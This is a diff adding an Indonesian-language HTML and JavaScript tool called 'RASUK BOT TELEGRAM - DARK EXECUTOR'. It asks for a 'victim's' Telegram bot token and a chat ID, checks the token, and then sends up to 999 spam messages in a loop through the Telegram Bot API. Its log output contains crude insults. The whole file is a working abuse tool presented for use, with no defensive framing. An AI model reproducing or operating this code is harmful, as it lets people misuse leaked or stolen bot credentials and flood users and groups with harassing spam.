@@ -1,0 +1,438 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RASUK BOT TELEGRAM - DARK EXECUTOR</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: #0a0a0a;
+            font-family: 'Segoe UI', 'Courier New', monospace;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #c0c0c0;
+            background-image: radial-gradient(circle at 20% 30%, #1a0a0a 0%, #0a0505 80%);
+        }
+        .container {
+            width: 100%;
+            max-width: 520px;
+            background: rgba(10, 8, 8, 0.92);
+            border: 2px solid #3a1a1a;
+            border-radius: 28px;
+            padding: 30px 25px;
+            box-shadow: 0 0 60px rgba(200, 30, 30, 0.25), inset 0 0 40px rgba(180, 0, 0, 0.05);
+            backdrop-filter: blur(6px);
+            transition: 0.3s;
+        }
+        .header {
+            text-align: center;
+            border-bottom: 1px solid #2a1010;
+            padding-bottom: 18px;
+            margin-bottom: 22px;
+            position: relative;
+        }
+        .header h1 {
+            font-size: 26px;
+            font-weight: 800;
+            letter-spacing: 4px;
+            color: #e03030;
+            text-shadow: 0 0 18px #b01010, 0 0 40px #800000;
+            text-transform: uppercase;
+            font-family: 'Courier New', monospace;
+        }
+        .header .sub {
+            font-size: 13px;
+            color: #7a4a4a;
+            letter-spacing: 2px;
+            margin-top: 4px;
+        }
+        .header .sub span {
+            color: #b05050;
+        }
+        .glow-line {
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #b02020, #ff4040, #b02020, transparent);
+            width: 70%;
+            margin: 12px auto 0;
+            border-radius: 10px;
+            animation: pulseGlow 1.8s infinite;
+        }
+        @keyframes pulseGlow {
+            0% { opacity: 0.3; transform: scaleX(0.95); }
+            50% { opacity: 1; transform: scaleX(1); }
+            100% { opacity: 0.3; transform: scaleX(0.95); }
+        }
+        .input-group {
+            margin: 20px 0 16px;
+        }
+        .input-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #b08080;
+            letter-spacing: 1px;
+            margin-bottom: 6px;
+            text-transform: uppercase;
+        }
+        .input-group input, .input-group textarea {
+            width: 100%;
+            padding: 14px 16px;
+            background: #141010;
+            border: 1px solid #2a1515;
+            border-radius: 14px;
+            color: #e0d0d0;
+            font-size: 15px;
+            font-family: 'Courier New', monospace;
+            transition: 0.25s;
+            outline: none;
+        }
+        .input-group input:focus, .input-group textarea:focus {
+            border-color: #b03030;
+            box-shadow: 0 0 20px rgba(180, 20, 20, 0.25);
+            background: #1a1010;
+        }
+        .input-group textarea {
+            resize: vertical;
+            min-height: 90px;
+        }
+        .row-duo {
+            display: flex;
+            gap: 12px;
+        }
+        .row-duo .input-group {
+            flex: 1;
+        }
+        .btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(145deg, #1a0a0a, #2a1010);
+            border: 1.5px solid #6a2020;
+            border-radius: 40px;
+            font-size: 18px;
+            font-weight: 700;
+            color: #e0b0b0;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            cursor: pointer;
+            transition: 0.2s;
+            margin: 10px 0 8px;
+            font-family: 'Courier New', monospace;
+            box-shadow: 0 4px 0 #0a0505;
+        }
+        .btn:hover {
+            background: linear-gradient(145deg, #2a1010, #3a1515);
+            border-color: #b04040;
+            color: #ffd0d0;
+            box-shadow: 0 0 30px rgba(200, 30, 30, 0.3);
+            transform: scale(1.02);
+        }
+        .btn:active {
+            transform: scale(0.97);
+            box-shadow: 0 2px 0 #0a0505;
+        }
+        .btn-danger {
+            border-color: #8a2020;
+            background: linear-gradient(145deg, #1f0a0a, #2f0a0a);
+        }
+        .status-box {
+            background: #0d0808;
+            border: 1px solid #1f1010;
+            border-radius: 16px;
+            padding: 14px 16px;
+            margin: 18px 0 8px;
+            max-height: 220px;
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            color: #b09090;
+            line-height: 1.7;
+            scroll-behavior: smooth;
+        }
+        .status-box::-webkit-scrollbar {
+            width: 5px;
+        }
+        .status-box::-webkit-scrollbar-track {
+            background: #0a0808;
+        }
+        .status-box::-webkit-scrollbar-thumb {
+            background: #4a2020;
+            border-radius: 10px;
+        }
+        .status-box .ok {
+            color: #60c060;
+        }
+        .status-box .err {
+            color: #e06060;
+        }
+        .status-box .info {
+            color: #d0a050;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 22px;
+            font-size: 11px;
+            color: #4a3030;
+            letter-spacing: 1px;
+            border-top: 1px solid #1a0d0d;
+            padding-top: 18px;
+        }
+        .footer span {
+            color: #6a4040;
+        }
+        .pulse-dot {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            background: #b02020;
+            border-radius: 50%;
+            margin-right: 8px;
+            animation: pulseDot 1.2s infinite;
+            vertical-align: middle;
+        }
+        @keyframes pulseDot {
+            0% { opacity: 0.2; transform: scale(0.7); }
+            50% { opacity: 1; transform: scale(1.2); }
+            100% { opacity: 0.2; transform: scale(0.7); }
+        }
+        .credit {
+            color: #5a3a3a;
+            font-size: 12px;
+            margin-top: 6px;
+        }
+        .credit a {
+            color: #8a5050;
+            text-decoration: none;
+        }
+        .credit a:hover {
+            color: #c07070;
+        }
+    </style>
+</head>
+<body>
+    <div class="container" id="app">
+        <div class="header">
+            <h1>⛧ RASUK BOT</h1>
+            <div class="sub"><span>⚡</span> TELEGRAM EXECUTOR <span>⚡</span></div>
+            <div class="glow-line"></div>
+        </div>
+
+        <div class="input-group">
+            <label>🤖 TOKEN BOT TARGET</label>
+            <input type="text" id="botToken" placeholder="Masukkan token bot korban..." value="">
+        </div>
+
+        <div class="row-duo">
+            <div class="input-group">
+                <label>👤 CHAT ID</label>
+                <input type="text" id="chatId" placeholder="ID grup / user..." value="">
+            </div>
+            <div class="input-group">
+                <label>📨 JUMLAH SPAM</label>
+                <input type="number" id="spamCount" placeholder="99999999999999" value="10" min="1" max="999">
+            </div>
+        </div>
+
+        <div class="input-group">
+            <label>💬 PESAN SPAM</label>
+            <textarea id="messageText" placeholder="Tulis pesan yang mau dikirim..." rows="2"> MANPUS KE RASUK! BY AGAM 🤓 </textarea>
+        </div>
+
+        <button class="btn" id="rasukBtn">▶ RASUK BOT</button>
+        <button class="btn btn-danger" id="stopBtn" style="display:none;">⏹ STOP RASUK</button>
+
+        <div class="status-box" id="logBox">
+            <div><span class="info">⏳ Menunggu eksekusi...</span></div>
+        </div>
+
+        <div class="footer">
+            <span class="pulse-dot"></span> SYSTEM ACTIVE · <span>DARK EXECUTOR v2.0</span>
+            <div class="credit">CREDIT BY @bulid_apk</div>
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            const logBox = document.getElementById('logBox');
+            const botTokenInput = document.getElementById('botToken');
+            const chatIdInput = document.getElementById('chatId');
+            const spamCountInput = document.getElementById('spamCount');
+            const messageText = document.getElementById('messageText');
+            const rasukBtn = document.getElementById('rasukBtn');
+            const stopBtn = document.getElementById('stopBtn');
+
+            let isRunning = false;
+            let stopRequested = false;
+
+            function log(msg, type = 'info') {
+                const entry = document.createElement('div');
+                const cls = type === 'ok' ? 'ok' : (type === 'err' ? 'err' : 'info');
+                entry.className = cls;
+                entry.textContent = msg;
+                logBox.appendChild(entry);
+                logBox.scrollTop = logBox.scrollHeight;
+            }
+
+            function clearLog() {
+                logBox.innerHTML = '';
+            }
+
+            function getToken() {
+                return botTokenInput.value.trim();
+            }
+
+            function getChatId() {
+                return chatIdInput.value.trim();
+            }
+
+            function getSpamCount() {
+                const val = parseInt(spamCountInput.value);
+                return isNaN(val) ? 10 : Math.min(Math.max(val, 1), 999);
+            }
+
+            function getMessage() {
+                return messageText.value.trim() || '⚠️ BOT ANDA TELAH DIRASUK! ⚠️';
+            }
+
+            function sleep(ms) {
+                return new Promise(resolve => setTimeout(resolve, ms));
+            }
+
+            function getBotInfo(token) {
+                return fetch(`https://api.telegram.org/bot${token}/getMe`)
+                    .then(r => {
+                        if (!r.ok) throw new Error('HTTP ' + r.status);
+                        return r.json();
+                    })
+                    .then(data => {
+                        if (!data.ok) throw new Error(data.description || 'Token tidak valid');
+                        return data.result;
+                    });
+            }
+
+            function sendMessage(token, chatId, text) {
+                const url = `https://api.telegram.org/bot${token}/sendMessage`;
+                const body = {
+                    chat_id: chatId,
+                    text: text,
+                    parse_mode: 'HTML'
+                };
+                return fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(body)
+                })
+                .then(r => {
+                    if (!r.ok) throw new Error('HTTP ' + r.status);
+                    return r.json();
+                })
+                .then(data => {
+                    if (!data.ok) throw new Error(data.description || 'Gagal kirim');
+                    return data;
+                });
+            }
+
+            async function rasukProcess(token, chatId, count, message) {
+                let successCount = 0;
+                let failCount = 0;
+                let isStopped = false;
+
+                for (let i = 1; i <= count; i++) {
+                    if (stopRequested) {
+                        log('⛔ Proses dihentikan oleh user.', 'err');
+                        isStopped = true;
+                        break;
+                    }
+
+                    const finalMsg = `${message}\n\n━━━━━━━━━━━━━━━━━\n[RASUK #${i}] · ${new Date().toLocaleTimeString()}\nCREDIT @bulid_apk`;
+                    try {
+                        await sendMessage(token, chatId, finalMsg);
+                        successCount++;
+                        log(`✅ [${i}/${count}] Pesan berhasil dikirim`, 'ok');
+                    } catch (e) {
+                        failCount++;
+                        log(`❌ [${i}/${count}] Gagal: ${e.message}`, 'err');
+                        if (e.message && (e.message.includes('401') || e.message.includes('403') || e.message.includes('bot'))) {
+                            log('💀 Token mungkin sudah dicabut atau chat ID salah!', 'err');
+                            break;
+                        }
+                    }
+                    await sleep(400);
+                }
+
+                if (!isStopped) {
+                    log(`━━━━━━━━━━━━━━━━━`, 'info');
+                    log(`✅ RASUK SELESAI! Sukses: ${successCount}, Gagal: ${failCount}`, 'ok');
+                }
+                return { successCount, failCount };
+            }
+
+            async function runRasuk() {
+                if (isRunning) return;
+
+                const token = getToken();
+                const chatId = getChatId();
+                const count = getSpamCount();
+                const message = getMessage();
+
+                if (!token) {
+                    log('❗ Masukkan TOKEN BOT dulu, anjing!', 'err');
+                    return;
+                }
+                if (!chatId) {
+                    log('❗ Masukkan CHAT ID (user atau grup)!', 'err');
+                    return;
+                }
+                if (count < 1) {
+                    log('❗ Jumlah spam minimal 1!', 'err');
+                    return;
+                }
+
+                clearLog();
+                log('🔄 Mengecek token bot...', 'info');
+
+                try {
+                    const botInfo = await getBotInfo(token);
+                    log(`✅ Token valid! Bot: @${botInfo.username || botInfo.first_name}`, 'ok');
+                    log(`📤 Target Chat ID: ${chatId}`, 'info');
+                    log(`📨 Akan mengirim ${count} pesan`, 'info');
+                    log('🚀 Memulai proses RASUK...', 'info');
+                    log('━━━━━━━━━━━━━━━━━', 'info');
+
+                    isRunning = true;
+                    stopRequested = false;
+                    rasukBtn.style.display = 'none';
+                    stopBtn.style.display = 'block';
+
+                    await rasukProcess(token, chatId, count, message);
+
+                } catch (e) {
+                    log(`💀 Error: ${e.message}`, 'err');
+                }
+
+                isRunning = false;
+                rasukBtn.style.display = 'block';
+                stopBtn.style.display = 'none';
+            }
+
+            function stopRasuk() {
+                if (!isRunning) return;
+                stopRequested = true;
+                log('⏳ Meminta penghentian...', 'info');
+            }
+
+            rasukBtn.addEventListener('click', runRasuk);
+            stopBtn.addEventListener('click', stopRasuk);
+
+            log('🧛 RASUK BOT TELEGRAM siap pakai.', 'ok');
+            log('💀 Masukkan token bot & chat ID, lalu eksekusi!', 'info');
+        })();
+    </script>
+</body>
+</html>
